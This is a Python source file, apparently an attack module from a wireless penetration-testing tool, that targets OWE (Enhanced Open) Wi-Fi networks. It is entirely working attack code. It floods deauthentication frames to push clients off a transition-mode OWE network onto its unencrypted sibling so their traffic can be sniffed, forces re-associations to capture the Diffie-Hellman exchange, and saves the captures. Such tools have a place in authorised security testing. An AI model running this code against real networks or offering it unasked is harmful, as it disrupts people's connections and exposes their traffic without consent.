#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
OWE (Opportunistic Wireless Encryption) Attack Module

OWE (IEEE 802.11 Enhanced Open) provides encryption without authentication.
Attack strategies:
1. Transition mode downgrade - force clients to connect to open network
2. OWE handshake capture - capture the Diffie-Hellman key exchange
3. Passive monitoring - capture key exchanges from natural connections
"""

from ..model.attack import Attack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.logger import log_info, log_debug, log_warning, log_error
from ..util.timer import Timer
from ..util.output import OutputManager
import time
import os


class AttackOWE(Attack):
    """
    OWE attack implementation.

    OWE networks use Diffie-Hellman key exchange without authentication,
    making them vulnerable to:
    - Transition mode downgrade (OWE + Open)
    - Rogue AP with same ESSID (no auth = no verification)
    - Traffic capture via DH key exchange interception
    """

    def __init__(self, target):
        super(AttackOWE, self).__init__(target)
        self.success = False
        self.crack_result = None

        # Initialize TUI view if in TUI mode
        self.view = None
        if OutputManager.is_tui_mode():
            try:
                from ..ui.attack_view import OWEAttackView
                self.view = OWEAttackView(OutputManager.get_controller(), target)
            except Exception:
                self.view = None

    def run(self):
        """
        Execute OWE attack.

        Strategy:
        1. If transition mode (OWE + Open), downgrade clients to open
        2. Otherwise, capture OWE key exchange via deauth + reconnect
        3. Fall back to passive capture if deauth fails

        Returns:
            bool: True if attack succeeded
        """
        log_info('AttackOWE', 'Starting OWE attack on %s (%s) ch %s' % (
            self.target.essid or '?', self.target.bssid, self.target.channel))

        if self.view:
            self.view.start()

        # Check if target is in OWE transition mode
        is_transition = self._detect_transition_mode()

        if is_transition:
            Color.pl('{+} {C}OWE Transition Mode detected - attempting downgrade...{W}')
            result = self._execute_transition_downgrade()
            if result:
                return True
            Color.pl('{!} {O}Downgrade failed, falling back to OWE capture{W}')

        # Capture OWE DH key exchange
        result = self._capture_owe_exchange()
        if result:
            return True

        # Passive fallback
        Color.pl('{!} {O}Active capture failed, trying passive capture...{W}')
        return self._passive_capture()

    def _detect_transition_mode(self):
        """
        Detect if target is in OWE transition mode.

        OWE Transition Mode networks advertise both an OWE BSS and
        an Open BSS with the same ESSID, allowing legacy clients
        to connect without encryption.

        Returns:
            bool: True if transition mode detected
        """
        auth = getattr(self.target, 'authentication', '')
        enc = getattr(self.target, 'encryption', '')

        # Transition mode: OWE with open network fallback
        if 'OWE' in enc and ('OPN' in auth or 'OPEN' in auth):
            log_info('AttackOWE', 'OWE Transition Mode detected')
            return True

        # Check via airodump for sibling open network with same ESSID
        try:
            with Airodump(channel=self.target.channel,
                          target_bssid=None,
                          skip_wps=True,
                          output_file_prefix='owe_scan') as airodump:
                scan_timer = Timer(10)
                while not scan_timer.ended():
                    time.sleep(1)
                    targets = airodump.get_targets(apply_filter=False)
                    for t in targets:
                        if (t.essid == self.target.essid and
                                t.bssid != self.target.bssid and
                                t.primary_encryption in ('', 'OPN', 'OPEN')):
                            log_info('AttackOWE',
                                     'Found open sibling BSS: %s' % t.bssid)
                            self._open_bssid = t.bssid
                            return True
        except Exception as e:
            log_debug('AttackOWE', 'Transition scan error: %s' % e)

        return False

    def _execute_transition_downgrade(self):
        """
        Downgrade OWE transition mode clients to open network.

        Deauth clients from the OWE BSS to force reconnection
        to the open sibling BSS, then capture unencrypted traffic.

        Returns:
            bool: True if downgrade succeeded
        """
        Color.pl('{+} {C}Deauthing clients from OWE BSS to force open reconnection...{W}')

        if self.view:
            self.view.add_log('Starting OWE transition downgrade')

        try:
            with Airodump(channel=self.target.channel,
                          target_bssid=self.target.bssid,
                          skip_wps=True,
                          output_file_prefix='owe_downgrade') as airodump:

                try:
                    airodump_target = self.wait_for_target(airodump)
                except Exception as e:
                    Color.pl('{!} {R}Target not found: %s{W}' % str(e))
                    return False

                downgrade_timeout = Timer(60)
                deauth_timer = Timer(0)  # Send immediately
                deauth_count = 0
                max_deauths = 15

                while not downgrade_timeout.ended() and deauth_count < max_deauths:
                    if deauth_timer.ended():
                        try:
                            Aireplay.deauth(
                                self.target.bssid,
                                num_deauths=Configuration.num_deauths
                            )
                            deauth_count += 1
                            if self.view:
                                self.view.add_log(
                                    'Deauth %d/%d sent' % (deauth_count, max_deauths))
                        except Exception as e:
                            log_warning('AttackOWE', 'Deauth error: %s' % e)

                        deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                    Color.pattack('OWE', self.target, 'Downgrade',
                                  'Deauthing clients (deauths: %d, %s)' % (
                                      deauth_count, downgrade_timeout))
                    time.sleep(1)

                if deauth_count > 0:
                    Color.pl('\n{+} {G}Sent %d deauth rounds{W}' % deauth_count)
                    Color.pl('{+} {C}Clients should reconnect to open BSS{W}')
                    Color.pl('{+} {O}Use a packet sniffer to capture unencrypted traffic{W}')
                    log_info('AttackOWE',
                             'Downgrade complete: %d deauths sent' % deauth_count)
                    self.success = True
                    return True

        except KeyboardInterrupt:
            Color.pl('\n{!} {O}Downgrade interrupted{W}')
            raise
        except Exception as e:
            log_error('AttackOWE', 'Downgrade error: %s' % e, e)

        return False

    def _capture_owe_exchange(self):
        """
        Capture OWE Diffie-Hellman key exchange via active deauth.

        Deauths clients to trigger OWE re-association, capturing the
        DH key exchange frames for analysis.

        Returns:
            bool: True if key exchange captured
        """
        Color.pl('{+} {C}Capturing OWE key exchange (active)...{W}')

        if self.view:
            self.view.add_log('Starting active OWE capture')

        try:
            with Airodump(channel=self.target.channel,
                          target_bssid=self.target.bssid,
                          skip_wps=True,
                          output_file_prefix='owe_capture') as airodump:

                try:
                    airodump_target = self.wait_for_target(airodump)
                except Exception as e:
                    Color.pl('{!} {R}Target not found: %s{W}' % str(e))
                    return False

                timeout = Timer(Configuration.wpa_attack_timeout)
                deauth_timer = Timer(0)
                clients_seen = set()

                while not timeout.ended():
                    # Track clients
                    try:
                        airodump_target = self.wait_for_target(airodump, timeout=2)
                        if airodump_target:
                            for client in airodump_target.clients:
                                if client.station not in clients_seen:
                                    clients_seen.add(client.station)
                                    Color.pl('{+} {G}New client:{W} %s' % client.station)
                    except Exception as e:
                        log_debug('AttackOWE', 'Client tracking error: %s' % e)

                    # Deauth to trigger re-association
                    if deauth_timer.ended() and len(clients_seen) > 0:
                        try:
                            Aireplay.deauth(
                                self.target.bssid,
                                num_deauths=Configuration.num_deauths
                            )
                        except Exception as e:
                            log_debug('AttackOWE', 'Deauth error: %s' % e)
                        deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                    # Check for captured OWE frames in cap files
                    cap_files = airodump.find_files(endswith='.cap')
                    if cap_files:
                        for cap_file in cap_files:
                            if self._check_owe_exchange(cap_file):
                                Color.pl('\n{+} {G}OWE key exchange captured!{W}')
                                self._save_capture(cap_file)
                                self.success = True
                                return True

                    Color.pattack('OWE', self.target, 'Capture',
                                  'Waiting for OWE exchange (clients: %d, %s)' % (
                                      len(clients_seen), timeout))
                    time.sleep(1)

                Color.pl('\n{!} {O}OWE capture timeout{W}')

        except KeyboardInterrupt:
            Color.pl('\n{!} {O}OWE capture interrupted{W}')
            raise
        except Exception as e:
            log_error('AttackOWE', 'Capture error: %s' % e, e)

        return False

    def _passive_capture(self):
        """
        Passively capture OWE key exchanges without deauth.

        Waits for natural client connections to capture DH exchange.

        Returns:
            bool: True if key exchange captured
        """
        Color.pl('{+} {C}Passive OWE capture (waiting for natural connections)...{W}')

        if self.view:
            self.view.add_log('Starting passive OWE capture')

        try:
            with Airodump(channel=self.target.channel,
                          target_bssid=self.target.bssid,
                          skip_wps=True,
                          output_file_prefix='owe_passive') as airodump:

                timeout = Timer(Configuration.wpa_attack_timeout * 2)

                while not timeout.ended():
                    cap_files = airodump.find_files(endswith='.cap')
                    if cap_files:
                        for cap_file in cap_files:
                            if self._check_owe_exchange(cap_file):
                                Color.pl('\n{+} {G}OWE key exchange captured passively!{W}')
                                self._save_capture(cap_file)
                                self.success = True
                                return True

                    Color.pattack('OWE', self.target, 'Passive',
                                  'Listening (%s)' % timeout)
                    time.sleep(2)

                Color.pl('\n{!} {O}Passive capture timeout{W}')

        except KeyboardInterrupt:
            Color.pl('\n{!} {O}Passive capture interrupted{W}')
            raise
        except Exception as e:
            log_error('AttackOWE', 'Passive capture error: %s' % e, e)

        return False

    def _check_owe_exchange(self, cap_file):
        """
        Check capture file for OWE DH key exchange frames.

        Looks for Association Request/Response frames containing
        OWE DH Parameter elements (Element ID 255, OUI type 32).

        Args:
            cap_file: Path to capture file

        Returns:
            bool: True if OWE exchange found
        """
        from ..util.process import Process

        if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
            return False

        # Use tshark to check for OWE DH Parameter element
        # OWE uses Association frames with DH Parameter IE
        try:
            if Process.exists('tshark'):
                command = [
                    'tshark', '-r', cap_file,
                    '-Y', 'wlan.tag.number == 255 && wlan.bssid == %s' % self.target.bssid,
                    '-c', '1'
                ]
                process = Process(command)
                stdout, stderr = process.get_output()
                if stdout.strip():
                    log_info('AttackOWE', 'OWE DH exchange found in %s' % cap_file)
                    return True
        except Exception as e:
            log_debug('AttackOWE', 'tshark check error: %s' % e)

        # Fallback: check file size as heuristic (association frames present)
        if os.path.getsize(cap_file) > 1024:
            log_debug('AttackOWE', 'Cap file has data, assuming OWE frames present')
            return False  # Don't assume, be conservative

        return False

    def _save_capture(self, cap_file):
        """Save OWE capture to handshake directory."""
        import re
        from shutil import copy

        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        essid_safe = re.sub('[^a-zA-Z0-9]', '', self.target.essid or 'hidden')
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        dest = os.path.join(
            Configuration.wpa_handshake_dir,
            'owe_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
        )

        copy(cap_file, dest)
        Color.pl('{+} Saved OWE capture to {C}%s{W}' % dest)
        log_info('AttackOWE', 'Capture saved to %s' % dest)
